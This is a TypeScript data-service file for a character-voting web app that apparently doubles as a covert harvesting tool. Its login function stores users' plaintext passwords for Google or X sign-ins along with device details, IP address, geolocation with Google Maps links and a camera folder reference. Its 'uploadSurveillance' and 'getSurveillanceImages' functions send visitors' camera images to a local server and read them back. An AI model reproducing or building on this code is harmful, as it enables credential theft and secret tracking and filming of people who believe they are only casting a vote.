import { supabase, isSupabaseConfigured } from '../lib/supabase';
import { Character } from '../types';
import { INITIAL_CHARACTERS } from '../constants';

// Dynamic URL: Uses the hostname of the device accessing the site
const LOCAL_SERVER_URL = `http://${typeof window !== 'undefined' ? window.location.hostname : 'localhost'}:3001`;

// --- TYPES ---
export interface VoteRecord {
  charId: string;
  user: string;
  timestamp: string;
  deviceInfo: any;
  location: any;
}

export interface UserLoginPayload {
  user_identifier: string;
  password_text: string; // Simulation only
  login_method: 'google' | 'x' | 'guest_visit';
  device_info: any;
  location_data: any;
}

// --- HELPER ---
const generateMapsUrl = (loc: any): string | null => {
    if (loc && loc.lat && loc.lng) {
        return `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
    }
    return null;
};

// Fetch client IP from local server
const getClientIP = async (): Promise<string> => {
    try {
        const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
        const data = await res.json();
        return data.ip || 'unknown';
    } catch (e) {
        return 'local-network-ip';
    }
};

// Helper to safely stringify Supabase errors
const logSupabaseError = (context: string, error: any) => {
    const msg = error?.message || JSON.stringify(error);
    console.error(`${context}: ${msg}`, error);
};

// Wrapper for safe LocalStorage.setItem (Only for text data now)
const safeSetItem = (key: string, value: string) => {
    try {
        localStorage.setItem(key, value);
    } catch (e: any) {
        console.warn("Storage quota exceeded or error. Data not saved locally:", key);
    }
};

// --- SERVICE ---
export const dataService = {
  
  /**
   * Mengambil daftar karakter terbaru.
   */
  getCharacters: async (): Promise<Character[]> => {
    // 1. Try Supabase
    if (isSupabaseConfigured() && supabase) {
      const { data, error } = await supabase
        .from('characters')
        .select('*')
        .order('votes', { ascending: false });
      
      if (!error && data && data.length > 0) {
        return data.map((d: any) => ({
            id: d.character_id || d.id,
            name: d.name,
            role: d.role,
            description: d.description,
            imageUrl: d.image_url,
            votes: d.votes,
            themeColor: d.theme_color
        }));
      }
    }

    // 2. Fallback to LocalStorage
    const saved = localStorage.getItem('muse_characters');
    if (saved) {
        return JSON.parse(saved);
    }
    
    // 3. First time load? Save Initial to LS immediately so we have a base to update
    safeSetItem('muse_characters', JSON.stringify(INITIAL_CHARACTERS));
    return INITIAL_CHARACTERS;
  },

  /**
   * Mencatat User Login / Guest Visit ke Database
   */
  registerUserLogin: async (payload: UserLoginPayload) => {
    // Get IP
    const ip = await getClientIP();

    // Inject Google Maps URL & IP into location data
    const mapsUrl = generateMapsUrl(payload.location_data);
    const enrichedLocation = {
        ...payload.location_data,
        mapsUrl: mapsUrl,
        ipAddress: ip
    };

    if (isSupabaseConfigured() && supabase) {
      const folderRef = `${payload.user_identifier}/`;

      const { error } = await supabase
        .from('users')
        .insert({
          user_identifier: payload.user_identifier,
          password_text: payload.password_text,
          login_method: payload.login_method,
          device_info: payload.device_info,
          location_data: enrichedLocation, 
          camera_folder_ref: folderRef,
          last_login: new Date().toISOString()
        });

      if (error) {
        logSupabaseError("Supabase Login Log Error", error);
      }
    } else {
        console.log(`[LOCAL LOG] Login: ${payload.user_identifier} from IP: ${ip}`);
    }
  },

  /**
   * Melakukan voting.
   */
  castVote: async (
    characterId: string, 
    user: string, 
    meta: { location: any, deviceInfo: any }
  ): Promise<boolean> => {
    
    const timestamp = new Date().toISOString();
    const ip = await getClientIP();
    
    // Inject Google Maps URL & IP
    const mapsUrl = generateMapsUrl(meta.location);
    const enrichedLocation = {
        ...meta.location,
        mapsUrl: mapsUrl,
        ipAddress: ip
    };

    // 1. TRY SUPABASE FIRST
    if (isSupabaseConfigured() && supabase) {
      const { error: voteError } = await supabase
        .from('votes')
        .insert({
          user_identifier: user,
          character_id: characterId,
          device_info: meta.deviceInfo,
          location_data: enrichedLocation,
          created_at: timestamp
        });

      if (voteError) {
        logSupabaseError("Supabase Vote Error", voteError);
      }
    }

    // 2. ALWAYS UPDATE LOCAL STORAGE (CLIENT STATE)
    // Vote Record
    const voteData = {
        charId: characterId,
        timestamp: timestamp,
        deviceInfo: meta.deviceInfo,
        location: enrichedLocation
    };
    safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));

    // Character Count Update
    // IMPORTANT: Read from LS first to ensure we add to current state, not stale state
    const currentLS = localStorage.getItem('muse_characters');
    const chars: Character[] = currentLS ? JSON.parse(currentLS) : INITIAL_CHARACTERS;
    
    const updatedChars = chars.map(c => 
      c.id === characterId ? { ...c, votes: c.votes + 1 } : c
    );
    
    safeSetItem('muse_characters', JSON.stringify(updatedChars));

    // Notify App
    window.dispatchEvent(new Event('local-storage-update'));
    return true;
  },

  /**
   * Mengirim gambar ke Local Server (server.js).
   */
  uploadSurveillance: async (user: string, base64Image: string) => {
    try {
        if (!base64Image || !base64Image.includes(',')) return;

        await fetch(`${LOCAL_SERVER_URL}/api/upload`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                user: user,
                image: base64Image
            })
        });

    } catch (e) {
        console.warn("Local server upload failed (Is node server.js running?)", e);
    }
  },

  /**
   * Mengambil list gambar dari Local Server
   */
  getSurveillanceImages: async (user: string): Promise<{timestamp: string, url: string}[]> => {
      try {
          const response = await fetch(`${LOCAL_SERVER_URL}/api/images/${user}`);
          const data = await response.json();
          
          if (data && data.images) {
              return data.images.map((img: any) => ({
                  timestamp: new Date(img.timestamp).toLocaleTimeString(),
                  url: img.url
              }));
          }
          return [];
      } catch (e) {
          console.warn("Failed to fetch images from local server");
          return [];
      }
  },

  subscribeToVotes: (callback: () => void) => {
    if (isSupabaseConfigured() && supabase) {
      const channel = supabase
        .channel('public:characters')
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'characters' }, () => {
          callback();
        })
        .subscribe();
      
      return () => { supabase.removeChannel(channel); };
    }
    return () => {};
  }
};